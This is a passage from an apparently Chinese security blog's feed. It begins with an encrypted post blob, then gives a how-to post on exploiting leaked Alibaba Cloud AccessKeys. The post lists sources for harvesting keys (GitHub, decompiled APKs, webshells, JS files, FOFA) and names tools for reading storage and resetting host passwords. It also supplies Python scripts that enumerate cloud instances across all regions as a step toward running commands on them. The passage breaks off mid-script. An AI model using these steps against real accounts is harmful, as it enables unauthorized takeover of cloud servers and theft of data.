becba24cbbe43e7c022ccfb44a7933e5478d173daf6761682692200233d0424c9ad91fa73d01c8edb1b02074c1c19bc5bc720bed9adffaf466e65cde808608d4d8c552973d738868dfecdc5e62295ddb0bde6878267cc4421772ca765f497b0a684817e24380b6657d573c99818f2f67109faf5c130d9a5c152a4db0f04eb2ceb88fa2d8c8b99663898a46ab728c40f5afaf19063d9d6485880aba337e3c78a4448cc81210b26017e6e8b1c6b313d4397ee0c0b5e83485ae442efa38540b1469ae119fb71491bd50269037b3d63def591e2734211efdbffbb5629b6389c88e23557267d3e1c3cc45645dc9ed64461802fa2d0d9299931398a68fcca221f417996fab0af0b1f573764ff9fe7e359e6bd7cacbb15a3aec0f88aabde46a3d04334005858f0a5820fcb3f1b978fa492f03a916fb4abc4b967f68ed78a8ee5c438a57aaa4a8ecfbff72d53a7ed51e232b975ff0c4455fa8a92e65cd10f09dc1699d06d2bdf16b52e68052505c7e7428d4de57f9cea18ed7297975f4102e0502c6a290cccbe9383f452af94aa44f233ab7dd733e13728f803cceb6c84cb5879866dc0935dc9657fed7f951f188fa5eba41b4a4991dc961c33e3db5752b338469571e00394031092ccf7266b9ab259db4ff73e03d8edb64b8bd20ca626d154e1ddc017fddd77bd6bbe63832ac8e35ab7854e18b2216df7f58d0c31fd763a0efa3deaa2fee443bbbeb39fe71d0ecb82aa1d87730f84bd87abd0636379c7ab6c0622fe319c5325731a9e63be1a8257b707dbce35c6ddecbbd9fe089e9e3b7dcd856f3a2d129579601f395e41d71ee6d50c87b99875ba88b0b01d1fd4cab662b2a7c8b627095f39209cc917e414305057cadb55e246d63be44e5ca25dc3b595cbc45e6f727275d671836ce80b98ae1e881fcd1242130dfd1a8cf157b9c3028c447c6c55d9ca0264127458a506eb9c5113af86f41fe9327b997955f3485c103d4ec38976c343cb29a9efda26c744c177a21f90632516c30500e897496ba168421448c6ae0d717c92aa9b8bba96e7cd64c0ae6a4f085aeeedd74d9e3cbd213a7a923a2e66eaf9694669213f7784bdc55fcf3cd1dd7d98fe4f114e2bce4dc9bad90916b7b01b2a2119d41575cf966d50d2ccb3c25b4dbd3491957c1c8a46647a8603e5ddc33620b5b854a62818907ae214734753567e18e85146bb01232672c44f59db08b3b42a3e4e1fe89accb3dc01f6011e6c155e886c5e52b06a91e94724da3d6df63e9685359da511980f4054ee041fb4ada1b863483f6196573d2cd5d28f157d39efe92c65e1a56dc4bdfd5daa44df978e26e8179ca055904f98b77479dbc3449fae854580636de6518d8d8e306cfe9ff19292d9f32609c1f5c135c551a12ab211621d0d124d93499dd5e63bbbbc318d39a7b475808d7fcfc0aa9e93e6ca71163d437d318aa43968e4866f41fc87613343d28113b8fc1f552b7f54828240095ecd6ddffc7d271c4486121de7f979c04ea54dd5c5e08e5398d820f8025f569bab97486cf9144a133096fb66e436669e6ce1a0e1195910c6268caac0f2190a64b9535cae14dd172c39e7806a161f6d7ea896e761a7b8a3dca9057485178249068b05a8d355a011ab9fc26abdb092eb2ce2af760f7140301c1632392607be5f063a687cd85a1ff225f37fa809ef1aca47dbd4695f98286347cf2b1798005cfda44064343bb7de1cc4d22578b7e7260a1ebcd20f5d7fa8135ef5b329836887839f1418babbfcde1c36288b91459a9ee3c6886ec3484d76871ed64abd9b13a35a654843a637dd8304036293178adbdf18069906e8162d97c4b742e9033d3f58db76d9675ddaafa187e48ed7bacdb6cc0ce19293990b8e09c3eefcb84552ff49986b8967357a982204660f35920e886c03a38e05287d1260456b4c65c91cba299cce784c0fc3e166d91eb7f9a71ea9c166a2021c0f32bcec32182894b7e2c73f528ceaede8e041f5cebb7ad675809b7fcc8613ec6d0c4be144aa076ef3e0e4e4262eb5aaf8f7b356545a9e1d3442cb3406b48238c0a53270df568fc1c027d22f74fcaabe3508d46871f631704dc0643cbdb4449425b96b0064c3b7339c7f37d6bb3efac0296cb36ea79d763247694b2eb1e1cc214f0b67c0968abf13b569c867a932c73a96eb99133386b59229c32a5a7d2794b54058aebabec153ef643d12ac3f381974aac9d38fe58315004289d37bc6ef551ad61daa36fcaf1bf84b14b200f942eb3450e914704c9a835fce70773b9d4968b5d6e34a3734496144b739f1d2aeb4e9ec43a94c51fdf0f1d777d7cf2352bc6b5b777c68ba331d9963d8983926a57e86014473a151dc528ba5ba04a55e29a658850559a7efabfea2c9374eaaef78712670adb24638e7482ddcad70899dae9d70ee65c91440e64c221ad3035de50d9dd302ae5e42cce192ba4e8b45f061e864c2e7d90eedb2f058c6ff5dbbf4596dff21019bca743fab38d0d101ab9aa2f08d2fe7865bebdeab40bde68fc723cb00c76ea55b08527237ee88bcb8aed722a464f6085bb01ac9874fd75a364831b2d8407a5f50eab64512895087037f01217976b686f7a636e456a7c53a5fc4950c9b4d6aeca9deffed9ae032416df5fbdb7fac1add0c219fe458ffa6b51bb7f761fe753adb3dab944ee94c59fd50534b0f1699a32376f56e48de35434296950c85535a7d2e91e2b796e0ca92f202f649dab3907b8f1db134850aba1d1cf88d6344136088aa9473a052f98fef1a893361b33da84bbff294e4170574b698a4f759c453a4fbf38aec1540946fbd658ad77b1707c774fce19d491045048f21eb1ee3b7968e82938cef9d9f0c5e78c4297724c8aa929676df62392769eb368bf8d2764e455c642cff60dff142bb29e44b5483392ed0d47e1db8d64cf42b15cd9276ae602506c560d04be27d3c59d0f6b8f60e2ecb49629e3874b933fb3a35676f247d19f0918a8fe8c4f1dc5116105d8fe0227d3c7766fa1c37a848d8feb362b6941090a5ffaa9386d3a5d391357d579ab87673f672281a823fbf4f7456675fe55c721903a10584dd3ca646bc7eca001d66cf2204306b5d49bca5fbba894a24b91f65c869f502f3bab42cb6a996368a7775918e5ac2f9e921a53ee80f476c47c50d1e061117057e971f35369ce6a06fb014437b8fffd942fdbce725530b0c072780a4a33a7a5a5de48cf4c04832a3013a90ba42cc9e0a7deb5218f8951f2cec900e9cb407dfb0c4de4e4b99c1ea165ef635dd61a79e666e9f2ef24c2cc0fa6a4d919de47487f45f211fb24fd7dff156f4769b2fcbedf49d35e626ed250dd50230325d9863d18b5a95cffc054520fa74d0438e2f964294c1682d7eaae5a078f0372da638f15ce0915ac761cd76cbb8bbce0d790d79de229d84b32f7d25208dc0faabae0a1bd1c3be8170a93ec114d784b787a2e21b21625038106243f66333d6a4c1aa118e283224b45bbdea942e149321e7c456536b84904ef27d8bac9bc8435d49ca16c33995de6093a4438dd1ee042073dd236182fbd045b5c0ea50ed26725b1802b5a67ceb2d81bbc8aac00e96c3389a40bb2977e15325e3ee0f6dea530322e890d0148f81baf2e94b75b14b6d779761ccda3000a21171eebdb8844b2e90fb11cd363f67b033459f7b1a2874e5d8387362a9ad37b18ced0f067bc0327c122a9145872b431661b038a9fd7cdd4c40d1530cde8028d0023505751086634277ca75823c8af5d533b04826c58529d95d547cd6d2d108c19797985b1cfa30e7649c697fb991b004527ee17a780af651799238df981b242511f6f602b77e7a1d4b6e894bd6d37db9209caf822e5c396aacd800ed338e75986f79e7dc076dd4d196b26d5613747857f988087c75097f82a23a842b5568bf8be04a5d5ba41d5d50df45dd86aa9bb0ad7016aebe08777b5c995f3fdb5571f33b6215e3a6c02127f3d8e0f15a8a993bfdfc51aef218e8c2bb7d9933b7dfecf4a6f83c2efefa8679be7cad359c6ac3cc7f5a586e02ff8eb656bb7cdaa69b5052597bae70b09dd19f8f36626bb6d1647dcea5186bf19642a77ab241300f989da40c8d1aafdd940b0aa7b536cdfb683d4af2e494c2ab2dbc74895e930e5758ede0c2f3362c329d56d86bb69f99ce41c3ab726e756d4631497c2a4d6db2c0e1f22140da4fb2f05b182b34c5df748c91c2acea5674147abdfdfff106934596e9df8cda1f6c1639b84c3d02d7a55e3ec0a27893ccc6429c0ff527c73caf7e42f78061c22fa7f5308c735f3b6606924cabd78da9a8dd0efab456ab7e80d1dce711c6a2c054f02c084d4a43655ead9a6af25264dffd74487d06f4dfd8abf3dc6f66414f77a7497f8b06a2b3d91cd28a15710e3400276c9a04c3ca611e904c9dee3859925dbc24436ff3a1a2221be82d5987b532fb1369a29fab1a54b0021c1b699087caca28feb8b596108f9a3310222ef1a12102bc662687b72592ee3904c0a78899a7d1b18a3153455a8b2cd7b4c88e5a1812f04c7f3d721920a0a888b40ac8d64f447f40987b684dbbf317d8778a35301bd7b4a7f50456f05156f3613aa41d63996ae18adf8c380077deb381b62b2cdc171a953329f2954b8432091c3c5e5d69958943f666ccc0a8fd089347714bfde29ced31e9a88ae5114fe3da2d8f78ee1221e05a2ae23a27f7f0427c22bedddca2b8e55201c6f9acb9addb24922d8211fe76a7a1a089760b4b9e13c02404d1a3adf3736bac5d9836c06fc0bc6790c2cf9e96a52227555d629addd414922041772dedfa2b874e899272fd4809666a44d44adde02ec93f1963e6b94ecc428f82e1c464ca7641c4c1c4d360b838fea6cf74441b6dcca95d6f59ca28bf3b1ae16a0843ca51b97bb852da3de6cd998181eaeed4269fecb725083d0ca2944da35c3cc2ce67bd8b8d7d78d40a4ac5d14e85a7adb2029924522adc02894ccbd71e5e68492853676a17506450f76f93753c5197222f428aa875d43c95a5d4aca2ab78d6f61e8cf132c03a243be7a73631717e771e886fb666da1dc92316f8d17a16437a19306ffebbbf2252646270a56263c6b49f2dbbdfd0d69fe7c7eb0cc9ee0bbb1b145022cdcd0e2b0af30c1b151acfc3655f5c4e759e8d4ebe719339f5e6376a034c85872de12b940da6d648a6c58f1aba15474b8083ecb75a3c8e568198e5f09c96982385157d80284e0a476a151b3fa4c32140b594f34fd9b810e5b7784b082b5ae959fe4fabb2eea9dbbfed23f92da71fcb4a37721b8e1598c4d990d24be3dea797c2bca6a46e48646ec9845adc5129e5301e982c8f1201ff3571ef0e04df4af93dda5dd88ba2e26c3b174ba1255d630fc478635cfbb3745881970f281acb69d469883ffc17ea8dcaf19e41dc7b4ee584bbe1a3d9a18886cd9eb54d6701b937e55b0bae5341f40514b72a87b3a221f3d4bd455473796571ffa54f6a98d467c42514c6701a14514d6179cc3edbf0989de52429a8d623f3d39f899aecd1ff8ed77da38723bc6dbc2e39d62629b1b107447c183ae8ee45a4753157a48a909778dccaead2c1f24715dfec0d88d615a990285013e55fe2fe6b3e87f81715a8f060ec0dabd7aed4fbb265cbb5122dd845a0ac0fb519812e7bec7943623c221b001e7297c9da0d6610f81855939c92e3cb713b1475849d02cd1bcecd1edea3bcb4280df89cfa154cd60bc916b5c779abd3a8660d09d1ca0105287f907ddf9c2ee8a25b6ed1c83ea20e9ad5bc689f336ead984979be8783cc7b3f04a2e4ce5cef7f429222080842f60b1ccb0e343d852386bce57542c33726bc49f5372db53bc2d221db15c589b54b5a2e58afb6043ea8d000645940664bdc09b78a60c97b013ebb549eeb4f3fd3da08f35edaf251df609ccbe766fd4818df912cb2db32334d1282730d549f6d7a099d62e8e8d6e3c04184835c808a2034ada2235756de77777510d378dda816dac89f1d1780b06a2fb619a21fe5f770ee980125c723ef7a9d6224000ee50067f8be63665869a9ae98fda62965d767274a620bcd2c3d46fbc7a99f7fcba8565100d9c261ea1fa77c73468556898dcfe446c09c4485fa19d733d4c00fe75307a2fcf9c1abd15cf9d113d98b644dd6c52421e7d19f90026510cd435c9044e8c6fe0db6d93353edfdf260eeb380d8a6f38a844c21a3bcbf71a7fb020502a49a6d0a840708a57387221fba0892106d81edad541325fc0419ea495668c52e078536848774b09dcbdd286ff735265d6c2c7a38e6152c3f0228c8beabc12450301f05dd826bb118e69e36ed3d9062e4ddcb2bc118e1a58c37a87ae122a4ebee7e3eaaf5894aa9de0ce4b9ef294ec8d567319c1967f1bd7fd9a3a8e387ebe538757059c87811b9033b5a259127108afb9bbbcf8e3743a7598c21d279349d6b1334e9436368a11d8cd323ed6cfb3ab27d97aae38f9edab75e3e2887e72c1a09d114caf4d40534856266cf5bb8562500e13d76e32743e253823b8ca8b37079e6c3dbd94708db23532088c8825c10c4a14f04e16d9871c971c4fbca07e862f4032c61d63a944d27fb8d8c01d56f84b7bfb055552904b12969b2099aab913a4b9be209c04ed1970f455f8e6dbe2fcabbd0f8f999c78e884e5991d23753f22034009a97c15426b14bb4b0572b690f2a9a4278e22deacc813219e01b86d0566a9ede60f03c0200b7140df0e084befb373a9761a0e67fe5f5b2b858667d9c503f2ce000190383cb5557645b4223bed57f9efcf611dda9da6c30aeb86574c350aa97993501933e81e0da6fce047216db2345fbc7950e8d52e773f0509888fecc544e5a18b83a7667d8d4c165c99d2d338a653eec9ef6952ac68645a87de0a928b0eae5ef8a0d8c74455ed2b1307a5ea7118ca66a9bf91f72972f8ec230ec1d77abd349a7bd410c3119b5b299dfb4ead5cd5b9eee0500d3004125b912166c937258387407138f0f2d1f993aa8532215f3295ae9386192080b46b6fff1db0b4b238007308a0510725ec6c1ff0360c2326f604912d9de54b7454a3cba6d480ad41658ba744ff0b896b5a1b31d98f13afa67dede1912e683842fe27a00b9c88a701ba10c027f2029dd12a3645f5f5b3612be2c65becb5ade1cdc715c3a8b53edac2f460c223f6a7dd2ea93e897d48a103d24db930dd06631ae8426980d80ddd4bf038541ca8de25a8736bc19ebec2cfca82c5dee240a29029b610d1d05a1b70066e54264a3201d3a4a430dcc6e991e5aca834eb3d6130257bcb3a144757d8193acb219e496561e30b2178c5dd89383bdeb37933bf827a5321a4c43d2f295b5eb0c12f03c9c927abc8e0260c47ebacd0ee166f1ca240bfea1faec2e92f110bdd45b39c42b5bac44f118191645c640a78f1fa82e332519592b957a4d7f00d95708845e57bb93c62b965ba6eaa0bbc83ab2ac8def81829787ff85b3edfb6884b771baa072cd1ab71bf604cc13eb018defe13abb95e3f25b4a174b3857810badb869b085b807ceec5bcae07594888053b353caf9693946bb8a6902f6b4c50c6edaa9805a27984d4820322648e01e5e36abe2ef1109de4be21f7cbe9bd45caeb067860fdc193156318379d439c8dcb1be4c102c793571e5d6df716946148b237c01df94b52e7d041a4a73e724add67d2be2aa921035d347f26bcb79d6aaaa344fc0c508c01d2ee5269d9b05a9bcb89c9bda9ec35a52c411d9daef134385b6bfe30c1606e07f4ae89450621aa552349b450b1e62f1ac0f2461f20498b7ac0147f258a23dc5067d431ebd533ec4cae5b443d7501347b2fd95bf03e2e9178194eef9dcb68be8c0ddfa58f4767a898e6f3d5830c49ef67ec3846469d05b6b7c235fb15c984247cf098370ef718b74f509c39d81ad62600887e4f17294dcc63156a3f9b63d879c51144a063d6c9ff73606b899c0720cd85a859fc70f717035142472eedbc1ccf8081d611392dae42805e8ca7f2a08685ca6a5e8ea3bac92512b5db11e9150405e956cae17bd8973a0eb3165fffe4f573cb19d4b3d1c4ef0ef034ddaf1021b2297e569c20b4fdbcea32c64114fab21ceb5903ec63341427ef4e102ad9872d3eadfac775bf5619945d9d7741f231223d9617c20cb94bb10ca11189d6903946815b6c3a0f191425af3951294b513c82df639bc4e43106c41e67583a4b65ad5ccfc29f5a56585616d2373778d27d5f0b96b6fab012a1cf07045bc08a7c97664b094774f6362b9ea3ec03becdf68a996861d069d2a343badcb86fa40e71204b5e8aa3bd90368ddbf13b7d6d24fa1fa8409fa67eef54f5f0796fc9311b9b4a1766c53cdecfeaea2046a128f34b4533bb5dca9c8b33e78ccbb82d9f2191ea297853bb6dc35b7b6ca20ae138a91de5b6041477e81825cc704c81933816433478458fa27d1a0116215de5c353c3b934994fc3c92304884fb717a032781ec690dc10b43c53168e7db21c9146ed01c8664593031cfabe917dce4ecb60d0231e829a9af62213b79eef66aa9d79dfde96194a8e6d30bbf7d422c1b98c8dc6fecc32395be282e244ce36c96f9f1d587d987bfbc9a3429616ae2a136d12ce1408935350118a20bb1983cf38c14edfa1d6d9a712a9583bd4b48456918da9d21814c018219055753495eebfa87744645d2bfc60b609142e6f7d6c4548d1796e788057edefb2a63854ffed9baeb69a5347574110d05a61abee7aae2dc8676e3df3df93816151b0b0e9c7de585944ea0ed4fc06481fc2030d6c24d12bf02b2b98ac943da1661da68b506fa6f11f34b116828c1c90ecf71955aba28133670fc49bce8f556f188aaf230118f289a75307c77afa7789526c417df3d24d984b44ffa6af3464f05670ba4ff43f88d23f2012a8bcc35b0deff3f1d36a1a7ea0de68b1b3376c0ce84d68760d9f12be0c1217ffe2aadb06f7b5b5e9a51e708e5bb0ad7dfc483061fc33a7e6215813c0e22bb4965decc06f3392b615769a37533f9c2e85a2f661010a9bb3d1f760d3445b535dd87460cb4b848bd230337b3cf7faf97b109fbf5020ae85c0004eb4d4f24b8137077f7221a4d527cf197d57884078d98b831811bc9919608968dd017b6a516ad5dffa7aa8b9fc2e42c87cdcff873b6ba65be9a7445ba4faaa0cd6096700b0e6fc64417794e3caf09c575a2e1344f9c36fc9ac705216bd6fbb1914926afac3c78677b5f8a34872abc8aa7f10212bcee233b8aadb984ff998ce3dd4a42ecaeab160ec675ae7a39132599895e9941d1a5d71db8fe31831de502020207fcb6e4970ce3d30f099ef814ddfe11d356af92a427e72a6a4d2d6b74f88ee3dbb26859d390ca441faf7de0670b5e75b19491355aaa5651f96d091f3c55091ac5029c7ace684aaf71a1ac62a8f698a8ffb95dc9ebd988195b5651d3d71b06c7113f71f6143192dab531940da8055174daba9347856c56c52ce3041002c4a221a9e99c8e91e74d30fa1b57508805764d7d1e2bef6f0a34fa31f23222051d63d96815c1757726da9d001302b842edb8067b0702092de043dd3bdc9aebe67b7f5ef56a62b7867c8b0156a3920fc48c081a75c45657b40f8accb4be015ad7373f6b5bf2740d65e3eb5d9992d3f498f2cb4db231a782b0f401e7905636fe92d60023af00c60923d1b83ce3c8fd88af8966e52e7fa7a30ffaa5abe34a493840d6296c85910883e42678d35df265a6b5b7437025a716cf699ffc2f6aec2de41c6a50bb79c64fed8e81646fcab7d1fa85d17a624360cddc5adf72cd1b5743cc69356c71826e23517c8eb4aecbd06b8f0e5a0efea9d90d59040fb617488510bc83d672b801407ce6e64ebdce9c0219a69f67ec0aa1db035a6c65f803848bd3bf09ef05401307be6e402fcdf1b18a2c0b6799e07e25b18cb81c30a251606187850d1c47620261f446f78d5edab0966e743c7e492897cb26358b6d136709c00f86b7eba31704ea60bc45748369c03d24bd485b139a5864de69a48f9b45143c1739a5a276f90aa827b1c459c1ea98e4e949f2c173893eed29d181d3cf11770472d8fe52971da3e2199bbd7ece6ce3cdd9c40882ad6554f5223e0a0ae5aaa5c965ccf3d744ad8f943da1389fa854d6951f67c21442839026808df6f2b985c5e5068858500cb6cb4aadab05c3d5e95a1531a1a673b2070ced5a5d0f919acdcd47b7142ab3dee36265aa022815114cd90a936f8a51de4b5b6f8cf3a69841973c12a989c3e4ee97cafe711d848d0531ed617899dd28864af97fcfa001dd0918133354d7d2a83256ed0371c229c5853505d2d63cba8f18b9bd6d925e7f05d3a0d1772d1581006bf8e0877274ed199ed2039a517a4b8b71cdbfd5212e0a2caaff0c774ff312d30ff887cacb22efa2be8b42f20d437b7699a791c24f592033631fa3429c8414d85af6142351118aefe37e1ac7abc5d78b16ab9c191d4196b2a2144fa671b2e3cb6ceebcccfe0559f7d53dbaa80c3949807585649a99cf359f008a9cf68a8a62b3f0cf888af2586db6d39ee902bf67bf96647b6bcf7910acc0f780561005a162b82826576b6d82380d3db0433a577ebe919590531c607958e1cb83b6481ef99b3a441aee4ad7bb3c90e1507ab4df72c5a72990d4e24f4cb3790d8e2c301bc8655b288bce9789fbb3622bf0c15641699bda3d7b96dcd88031111a92a3668c786a7b65ce61dcca26cb1d1457b260d6e6d88adc27093b7773a5438f90c5c39238ec0eaf7c57fdafe9760f5292a5f29b09615e98ca5d7152bf932fff35c02558e4cb835ea855bde520fdbb3268eb4c186510e3853d89f4b6e005d897f3638e0f7d2faa52838c23250bec3df550053c1701c0e97b03fba1a4846ffb28d6b3d9f5eae744f0504feead2743518977dc4ded325912a5ceaf015f2cf10c7f93b2db3e64101e3c96ad124fbf537bda8f73fdbd365303bf0f934d6553852b90d34f8e91fbcb8c8dd1a00942de733b543105803eedfcb6196e946b0cffccc136c783bb7bf35c7e8f13a584fc558700b68ddc741ebed187eda1c93d19e6d5a0a5f36a0aefc4f0ef27b5ede3a41cd7bcb1e260ce0bc48156a33e633f0544629692a8fa678eac165c0146dfc3610be28ea2159cb9f7b4b1b0e735291783bb6b8080b94cf7865a8e6ef0c3c95669c7aaf706fe358779ee52cf2c285fea1e66d916cfacb149d33ab133d4421a3100f63bbff8866d1f97c862d3e161c80c8e7363d0856917ba0bd6e9be9f757556df1166a9b58d41e16b82c495d72f10cdacd84788ef6d174de5a51479d3045ad7b147db64ac9f9785cad2f8a455150b84ad524a59028a1cdf23f38b42e4e4576c62f2fe522d862b4f07702375a4e53ce24ab6654bb300f81015182fea20663e618e6717e2e7e6366febd0032e97c2674db2677464f6e7ed137f9df16e8e521e0659730a6362b3413bbc162a4831883919cea940dd1f6b9d656e1658647e0c32066bf3be02662ec3f453637c0c0f0a0a06cf8248d485fd9103c1a07faa7880f38e7dd5f9531d364e758d5362fb41358cc78f1bf62922f2b4d8ffb0690be43ddbb18b673dee814f9f7867e5ce1573c9649bafc81c27a2aafd0dca6fb1b233b5dadc637e9966960f912169596a308bf7599de49d7bd8653a34a9d64650718d832998c6507e0fabfd11f0d7852d74c17a1ece10ac671dbc796e65552a0c976aea1ed5387935cd983f2c3364580961d80c09207d1621204f14b384d69466a77125032b9191ef19f4ed47379eefde8a19bc8fc6d927bfde8ebbf74ddf714ddfd13d94320cef039448f661ad48182a02effe1c2cf6cac89527</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      密码
    
    </summary>
    
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>阿里云AccessKey泄露的利用</title>
    <link href="http://yoursite.com/2020/09/01/%E9%98%BF%E9%87%8C%E4%BA%91AccessKey%E6%B3%84%E9%9C%B2%E7%9A%84%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2020/09/01/%E9%98%BF%E9%87%8C%E4%BA%91AccessKey%E6%B3%84%E9%9C%B2%E7%9A%84%E5%88%A9%E7%94%A8/</id>
    <published>2020-08-31T16:00:00.000Z</published>
    <updated>2020-09-02T04:08:05.151Z</updated>
    
    <content type="html"><![CDATA[<p>在渗透测试非法网站中，很多站都是在阿里云，亚马逊云搭建的站点。而阿里云AccessKey的泄露根用户权限大可以直接接管ECS，AWS则是有限制的，不是根用户是通过IAM来创建的用户，访问S3，EC2是分了权限控制的。在渗透测试中获取AccessKey的思路：github泄露，apk反编译泄露key，比较低权限的webshell，js文件，fofa查找。</p><h4 id="工具利用"><a href="#工具利用" class="headerlink" title="工具利用"></a><strong>工具利用</strong></h4><p>利用<a href="https://github.com/aliyun/oss-browser/blob/master/all-releases.md?spm=a2c63.p38356.879954.6.745223c9XFlufA&file=all-releases.md" target="_blank" rel="noopener">OSS Browser</a> 获取oss上面的数据</p><div align="left"><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/1.png" loading="lazy"></div><p>利用<a href="https://yun.cloudbility.com/" target="_blank" rel="noopener">行云管家</a>获取云主机列表，行云管家可以重置ECS的密码（千万别这样做）</p><div align="left"><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/2.png" loading="lazy"></div><h4 id="OpenAPI-Explorer"><a href="#OpenAPI-Explorer" class="headerlink" title="OpenAPI Explorer"></a><strong>OpenAPI Explorer</strong></h4><p>python导入模块(python2的环境)</p><pre><code>pip install oss2pip install aliyun-python-sdk-ecs </code></pre><ol><li>利用DescribeInstances获取某个区域的云主机列表（DescribeInstances.py）</li></ol><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/6/3.png" alt="" loading="lazy"></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>client <span class="token keyword">import</span> AcsClient<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ClientException<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ServerException<span class="token keyword">from</span> aliyunsdkecs<span class="token punctuation">.</span>request<span class="token punctuation">.</span>v20140526<span class="token punctuation">.</span>DescribeInstancesRequest <span class="token keyword">import</span> DescribeInstancesRequestclient <span class="token operator">=</span> AcsClient<span class="token punctuation">(</span><span class="token string">'&lt;accessKeyId>'</span><span class="token punctuation">,</span> <span class="token string">'&lt;accessSecret>'</span><span class="token punctuation">,</span> <span class="token string">'cn-shanghai'</span><span class="token punctuation">)</span>request <span class="token operator">=</span> DescribeInstancesRequest<span class="token punctuation">(</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>set_accept_format<span class="token punctuation">(</span><span class="token string">'json'</span><span class="token punctuation">)</span>response <span class="token operator">=</span> client<span class="token punctuation">.</span>do_action_with_exception<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>脚本会输出该区域的公网内网IP，主机名称，InstanceId等等。批量获取所以区域的主机信息(主机名称，操作系统，内网IP，公网IP，区域，InstanceId)，InstanceId在后面的命令执行需要。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">import</span> json<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>client <span class="token keyword">import</span> AcsClient<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ClientException<span class="token keyword">from</span> aliyunsdkcore<span class="token punctuation">.</span>acs_exception<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ServerException<span class="token keyword">from</span> aliyunsdkecs<span class="token punctuation">.</span>request<span class="token punctuation">.</span>v20140526<span class="token punctuation">.</span>DescribeInstancesRequest <span class="token keyword">import</span> DescribeInstancesRequestRegionIdes <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'华东1（杭州）'</span><span class="token punctuation">:</span><span class="token string">'cn-hangzhou'</span><span class="token punctuation">,</span>    <span class="token string">'华东2（上海）'</span><span class="token punctuation">:</span><span class="token string">'cn-shanghai'</span><span class="token punctuation">,</span>    <span class="token string">'华东 2 金融云'</span><span class="token punctuation">:</span><span class="token string">'cn-shanghai-finance-1'</span><span class="token punctuation">,</span>    <span class="token string">'华北1（青岛）'</span><span class="token punctuation">:</span><span class="token string">'cn-qingdao'</span><span class="token punctuation">,</span>    <span class="token string">'华北2（北京）'</span><span class="token punctuation">:</span><span class="token string">'cn-beijing'</span><span class="token punctuation">,</span>    <span class="token string">'华北3（张家口）'</span><span class="token punctuation">:</span><span class="token string">'cn-zhangjiakou'</span><span class="token punctuation">,</span>    <span class="token string">'华北5（呼和浩特）'</span><span class="token punctuation">:</span><span class="token string">'cn-huhehaote'</span><span class="token punctuation">,</span>    <span class="token string">'华北6（乌兰察布 ）'</span><span class="token punctuation">:</span><span class="token string">'cn-wulanchabu'</span><span class="token punctuation">,</span>    <span class="token string">'华北 2 阿里政务云1'</span><span class="token punctuation">:</span><span class="token string">'cn-north-2-gov-1'</span><span class="token punctuation">,</span>    <span class="token string">'华南1（深圳）'</span><span class="token punctuation">:</span><span class="token string">'cn-shenzhen'</span><span class="token punctuation">,</span>    <span class="token string">'华南 1 金融云'</span><span class="token punctuation">:</span><span class="token string">'cn-shenzhen-finance-1'</span><span class="token punctuation">,</span>    <span class="token string">'华南2（河源）'</span><span class="token punctuation">:</span><span class="token string">'cn-heyuan'</span><span class="token punctuation">,</span>    <span class="token string">'西南1（成都）'</span><span class="token punctuation">:</span><span class="token string">'cn-chengdu'</span><span class="token punctuation">,</span>    <span class="token string">'中国（香港）'</span><span class="token punctuation">:</span><span class="token string">'cn-hongkong'</span><span class="token punctuation">,</span>    <span class="token string">'新加坡'</span><span class="token punctuation">:</span><span class="token string">'ap-southeast-1'</span><span class="token punctuation">,</span>    <span class="token string">'澳大利亚（悉尼）'</span><span class="token punctuation">:</span><span class="token string">'ap-southeast-2'</span><span class="token punctuation">,</span>    <span class="token string">'马来西亚（吉隆坡）'</span><span class="token punctuation">:</span><span class="token string">'ap-southeast-3'</span><span class="token punctuation">,</span>    <span class="token string">'印度尼西亚（雅加达）'</span><span class="token punctuation">:</span><span class="token string">'ap-southeast-5'</span><span class="token punctuation">,</span>    <span class="token string">'日本（东京）'</span><span class="token punctuation">:</span><span class="token string">'ap-northeast-1'</span><span class="token punctuation">,</span>    <span class="token string">'印度（孟买）'</span><span class="token punctuation">:</span><span class="token string">'ap-south-1'</span><span class="token punctuation">,</span>    <span class="token string">'德国（法兰克福）'</span><span class="token punctuation">:</span><span class="token string">'eu-central-1'</span><span class="token punctuation">,</span>    <span class="token string">'英国（伦敦）'</span><span class="token punctuation">:</span><span class="token string">'eu-west-1'</span><span class="token punctuation">,</span>    <span class="token string">'美国（硅谷）'</span><span class="token punctuation">:</span><span class="token string">'us-west-1'</span><span class="token punctuation">,</span>    <span class="token string">'美国（弗吉尼亚）'</span><span class="token punctuation">:</span><span class="token string">'us-east-1'</span><span class="token punctuation">,</span>    <span class="token string">'阿联酋（迪拜）'</span><span class="token punctuation">:</span><span class="token string">'me-east-1'</span><span class="token punctuation">}</span><span class="token keyword">for</span> RegionId <span class="token keyword">in</span> RegionIdes<span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 填入AccessKey ID 和 AccessKey Secret </span>    client <span class="token operator">=</span> AcsClient<span class="token punctuation">(</span><span 